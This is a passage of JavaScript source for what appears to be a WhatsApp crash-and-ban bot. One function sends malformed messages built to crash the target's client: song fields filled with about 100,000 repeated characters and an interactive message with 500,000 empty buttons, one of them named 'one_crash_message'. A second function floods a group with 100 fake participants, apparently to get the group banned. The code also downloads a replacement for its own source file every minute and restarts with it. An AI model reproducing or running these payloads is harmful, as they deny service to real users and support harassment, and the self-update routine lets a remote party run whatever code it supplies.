                    }
                }
            }
        }
    });

    await sock.relayMessage(target, {
        videoMessage: {
            caption: "Monkey",
            url: "https://mmg.whatsapp.net/v/t62.7161-24/571089696_1578100283684655_1996386148214686670_n.enc?ccb=11-4&oh=01_Q5Aa5AG5viI32JxJJ0IldU3Yg-aD90feCWAmyU_8ICQkLa7NMQ&oe=6A78786C&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "ItZ54Zu/3nrFZprYKSUgWCSgZaEOHWgr1aXikyyIeao=",
            fileLength: "621181",
            seconds: 15,
            mediaKey: "yx4YEt5ImD3mgjH2sG4ZFZDdDRGbBvKBoFJ/dr25jFw=",
            height: 850,
            width: 478,
            fileEncSha256: "8BZYx5XvG8m9JWeQ9wCTNTgCiccUqZfdF4tolyNvu4I=",
            directPath: "/v/t62.7161-24/571089696_1578100283684655_1996386148214686670_n.enc?ccb=11-4&oh=01_Q5Aa5AG5viI32JxJJ0IldU3Yg-aD90feCWAmyU_8ICQkLa7NMQ&oe=6A78786C&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1783692675",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            contextInfo: {
                isQuestion: true,
                forwardingScore: 0,
                featureEligibilities: {
                    cannotBeRanked: false,
                    canBeReshared: false
                },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "MUSIC_STANDALONE"
            },
            streamingSidecar: "Em3CJwQ+xKOAjShRk2YTXaJn4LINew82ajTPSSUF7Ds8Nk6SYq9WKBqwA1cpf6BRsJZSD4dUsKSejKCB4qOa1DZJi5J6BZmjGSDUKV5vW0FoSnvWFwFPomTdoW5XUtZYJT/dLA==",
            thumbnailDirectPath: "/v/t62.36147-24/622381825_1411995144178468_4020528106761426645_n.enc?ccb=11-4&oh=01_Q5Aa5AFUiYB61PflYmKfC3Ln8hhVz7qSAGwWfTpDh3Z57M9e_w&oe=6A785411&_nc_sid=5e03e0",
            thumbnailSha256: "6wb6fbOKiMr8HlTcL5Us1GSyMm9q8k+a7h7cVU90KpY=",
            thumbnailEncSha256: "v3dEQyY3ePW9gWYOK0RKpjVAkv4Y/sRl8ERzruRbBJ8=",
            annotations: [
                {
                    polygonVertices: [
                        { x: 0.17499999701976776, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.6620468497276306 },
                        { x: 0.17499999701976776, y: 0.6620468497276306 }
                    ],
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "2261401457948346",
                            songId: "849859527815275",
                            author: "Monkey" + "ြ".repeat(55000),
                            title: "ြ".repeat(45000),
                            artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                            artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                            artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                            artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                            artistAttribution: "https://www.instagram.com/_u/ndarboy_genk",
                            countryBlocklist: "WEs=",
                            isExplicit: false
                        }
                    },
                    embeddedAction: true
                }
            ]
        }
    });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200C" + "\u200B" + "\u200D" + "\u200D" + "\u200A" + "\x923" + "\x10" + "\u0000"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    nativeFlowResponsMessage: {
                        buttons: [
                            { name: "one_crash_message" },
                            { name: "booking_status" },
                            {
                                name: "booking_confirm",
                                bookingId: "success",
                            }
                        ]
                    }
                }
            }
        }
    });
}

//FUNCTION BAND GB

async function Funcoli(sock, target) {
    if (!target.endsWith("@g.us")) throw new Error('@g.us server required');

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('No valid JIDs');

    for (let i = 0; i < jids.length; i++) {
        const group = jids[i];

        try {
            await sock.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add");
        } catch (_) {}

        try {
            await sock.groupParticipantsUpdate(group, ['971500000000@s.whatsapp.net'], 'add');
        } catch (_) {}

        try {
            await sock.sendPresenceUpdate('composing', group);
        } catch (_) {}

        try {
            const fakeNumbers = Array.from({ length: 100 }, () => {
                return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net';
            });
            for (const fakeJid of fakeNumbers) {
                await sock.groupParticipantsUpdate(group, [fakeJid], 'add').catch(() => {});
                await new Promise(r => setTimeout(r, 30));
            }
            await sock.sendMessage(group, { text: `✅ Band Gb Sukses` }).catch(() => {});
        } catch (_) {}
    }
}

// ============ AUTO UPDATE DARI GIST ============
const GIST_RAW_URLL = "";
const CHECK_INTERVAL = 60 * 1000; // 1 MENIT

async function updateBot() {
  try {
    const { data: remote } = await axios.get(GIST_RAW_URLL, {
      timeout: 10000,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      }
    });

    const local = fs.readFileSync(__filename, "utf8");

    if (remote !== local) {
      console.log(chalk.yellow("🔄 UPDATE TERSEDIA..."));

      fs.writeFileSync(__filename, remote);

      console.log(chalk.green("✅ UPDATE BERHASIL! RESTARTING..."));

      setTimeout(() => {
        process.exit(0);
      }, 1000);
    }

  } catch {}
}

// CEK UPDATE DI BACKGROUND
updateBot();
setInterval(updateBot, CHECK_INTERVAL);

// LAUNCH BOT
bot.launch();